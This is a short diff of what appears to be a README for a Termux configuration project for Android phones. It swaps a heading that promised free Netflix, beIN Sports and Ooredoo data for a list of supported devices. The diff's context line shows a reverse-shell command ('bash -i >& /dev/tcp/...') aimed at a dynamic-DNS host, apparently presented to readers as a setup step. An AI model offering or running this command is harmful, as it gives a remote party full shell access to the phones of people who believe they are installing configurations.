@@ -43,7 +43,7 @@ bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <img src="images/logo.png" alt="Logo" width="80" height="80">
   </a>
 
-  <h3 align="center">Configurations for termux to be able to learn and download tools such as  netflix beinsports and also free ooredoo data.</h3>
+  <h3 align="center">Configurations for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Thanks.</h3>
 
   <p align="center">
     An awesome cfgs to jumpstart your projects!
